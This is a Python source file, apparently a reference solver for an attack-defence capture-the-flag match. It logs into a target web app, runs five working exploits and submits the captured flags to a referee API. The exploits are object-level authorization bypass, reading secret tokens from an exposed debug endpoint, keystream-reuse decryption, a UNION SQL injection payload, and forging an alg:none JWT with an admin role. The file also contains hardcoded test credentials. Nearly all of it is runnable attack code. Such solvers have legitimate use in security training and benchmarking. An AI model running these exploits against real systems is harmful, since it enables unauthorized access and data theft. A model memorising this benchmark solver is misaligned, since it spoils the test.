    def _submit_flag(self, flag: str, slot_hint: str) -> bool:
        if flag in self.submitted:
            return True
        self.submitted.add(flag)
        url = f"{self.referee}/api/matches/{self.match_id}/submit"
        payload = json.dumps(
            {
                "player_id": self.attacker_id,
                "flag": flag,
                "target_player_id": self.victim_id,
            }
        ).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                log.info(f"submit {slot_hint}: {resp.status} {body[:200]}")
                try:
                    return bool(json.loads(body).get("success"))
                except Exception:
                    return False
        except Exception as e:
            log.warning(f"submit {slot_hint} error: {e}")
            return False

    def exploit_flag1_bola(self) -> Optional[str]:
        """IDOR/BOLA: log in as low-priv editor, read own report at /reports/mine to
        learn the referenced admin escalation report id, then GET /reports/:id —
        the detail action omits the per-object owner check."""
        opener = self._login("editor", "editor456")
        if not opener:
            return None
        status, body = self._request(opener, "/reports/mine")
        if status != 200:
            log.warning(f"flag1: /reports/mine status={status}")
            return None
        try:
            ref = json.loads(body).get("report", {}).get("escalation_ref")
        except Exception:
            ref = None
        if not ref:
            log.warning("flag1: no escalation_ref in own report")
            return None
        status, body = self._request(opener, f"/reports/{ref}")
        if status == 200:
            m = FLAG_RE.search(body)
            if m:
                return m.group(0)
            log.warning("flag1: 200 but no FLAG in escalation report")
        else:
            log.warning(f"flag1: /reports/{ref} status={status}")
        return None

    def exploit_flag2_debug_runtime(self) -> Optional[str]:
        status, body = self._request(None, "/debug/env")
        if status == 200:
            try:
                data = json.loads(body)
                flag = data.get("environment", {}).get("PAYROLL_SYNC_TOKEN", "")
                if FLAG_RE.fullmatch(flag):
                    return flag
            except Exception:
                pass
            log.warning("flag2: 200 but PAYROLL_SYNC_TOKEN was missing or invalid")
        return None

    def exploit_flag3_keystream_reuse(self) -> Optional[str]:
        """
        A02 keystream reuse (many-time pad): /exports/encrypted XORs every item
        with the same fixed keystream. Use the editor's readable report as known
        plaintext, recover the keystream from its ciphertext, then decrypt vault.
        """
        opener = self._login("editor", "editor456")
        if not opener:
            return None
        status, body = self._request(opener, "/reports/mine")
        if status != 200:
            log.warning(f"flag3: /reports/mine status={status}")
            return None
        try:
            report = json.loads(body).get("report", {})
            item_id = report.get("id")
            known_pt = (report.get("body") or "").encode("latin1")
        except Exception as e:
            log.warning(f"flag3: parse /reports/mine failed: {e}")
            return None
        if not item_id or len(known_pt) < 40:
            log.warning(f"flag3: known plaintext too short ({len(known_pt)} bytes)")
            return None
        _, kbody = self._request(opener, f"/exports/encrypted?item={item_id}")
        _, vbody = self._request(opener, "/exports/encrypted?item=vault")
        try:
            c_known = bytes.fromhex(json.loads(kbody)["cipher_hex"])
            c_vault = bytes.fromhex(json.loads(vbody)["cipher_hex"])
        except Exception as e:
            log.warning(f"flag3: export parse failed: {e}")
            return None
        if len(known_pt) < len(c_vault):
            log.warning("flag3: known plaintext shorter than vault ciphertext")
            return None
        keystream = bytes(c ^ p for c, p in zip(c_known, known_pt))
        plaintext = bytes(c ^ k for c, k in zip(c_vault, keystream)).decode("latin1")
        m = FLAG_RE.search(plaintext)
        if m:
            return m.group(0)
        log.warning(f"flag3: recovered plaintext has no FLAG: {plaintext!r}")
        return None

    def exploit_flag4_sqli(self) -> Optional[str]:
        author = self._login("author", "storyDraft2024")
        if not author:
            return None
        payload = "') UNION SELECT id,name,value,NULL,NULL,NULL,NULL FROM flags WHERE name='flag_4'--"
        status, body = self._request(
            author, "/posts/search?q=" + urllib.parse.quote(payload)
        )
        if status == 200:
            m = FLAG_RE.search(body)
            if m:
                return m.group(0)
        return None

    def exploit_flag5_token_forge(self) -> Optional[str]:
        """Token forgery: /admin/analytics trusts the JWT-style Bearer [REDACTED]'s own
        `alg` header and honours alg:"none" without a signature check. Log in as
        low-priv editor, take the token issued at login, re-encode it with
        {"alg":"none"} and role=admin (signature dropped), and read the analytics."""
        opener = _make_opener()
        status, body = self._request(
            opener,
            "/login",
            method="POST",
            body=json.dumps({"username": "editor", "password": "***"}).encode(),
            headers={"Content-Type": "application/json", "Accept": "application/json"},
        )
        if status != 200:
            log.warning(f"flag5: login status={status}")
            return None

        def b64url(obj) -> str:
            raw = json.dumps(obj, separators=(",", ":")).encode()
            return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

        try:
            real = json.loads(body).get("token", "")
            payload_seg = real.split(".")[1]
            pad = "=" * (-len(payload_seg) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload_seg + pad))
        except Exception:
            claims = {"username": "editor"}
        claims["role"] = "admin"
        forged = f"{b64url({'alg': 'none', 'typ': 'JWT'})}.{b64url(claims)}."
        status, body = self._request(
            opener, "/admin/analytics", headers={"Authorization": f"Bearer {forged}"}
        )
        if status == 200:
            m = FLAG_RE.search(body)
            if m:
                return m.group(0)
            log.warning("flag5: 200 but no FLAG in analytics")
        else:
            log.warning(f"flag5: /admin/analytics status={status}")
        return None

    def run(self) -> dict:
        exploits = [
            ("flag_1", self.exploit_flag1_bola),
            ("flag_2", self.exploit_flag2_debug_runtime),
            ("flag_3", self.exploit_flag3_keystream_reuse),
            ("flag_4", self.exploit_flag4_sqli),
            ("flag_5", self.exploit_flag5_token_forge),
        ]
        summary: dict = {"flags_captured": [], "flags_missed": []}
        for slot, fn in exploits:
            if self._remaining() <= 0:
                summary["flags_missed"].append({"slot": slot, "reason": "timeout"})
                continue
            try:
                flag = fn()
            except Exception as e:
                log.exception(f"{slot} crashed: {e}")
                flag = None
            if flag and FLAG_RE.fullmatch(flag):
                accepted = self._submit_flag(flag, slot)
                summary["flags_captured"].append(
                    {"slot": slot, "flag": flag, "accepted": accepted}
                )
            else:
                summary["flags_missed"].append({"slot": slot, "reason": "exploit_failed"})
        return summary


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target-host", required=True)
    ap.add_argument("--target-port", type=int, default=3000)
    ap.add_argument("--referee-url", required=True)
    ap.add_argument("--match-id", required=True)
    ap.add_argument("--attacker-id", type=int, required=True)
    ap.add_argument("--victim-id", type=int, required=True)
    ap.add_argument("--budget-seconds", type=int, default=900)
    ap.add_argument("--target-wait-seconds", type=int, default=90)
    args = ap.parse_args()

    deadline = time.time() + args.budget_seconds
    ready_by = time.time() + args.target_wait_seconds
    while time.time() < ready_by:
        try:
            with urllib.request.urlopen(
                f"http://{args.target_host}:{args.target_port}/health", timeout=3
            ) as r:
                if r.status == 200:
                    break
        except Exception:
            time.sleep(3)

    client = OracleClient(
        target_host=args.target_host,
        target_port=args.target_port,
        referee_url=args.referee_url,
        match_id=args.match_id,
        attacker_id=args.attacker_id,
        victim_id=args.victim_id,
        deadline=deadline,
    )
    print(json.dumps(client.run(), indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
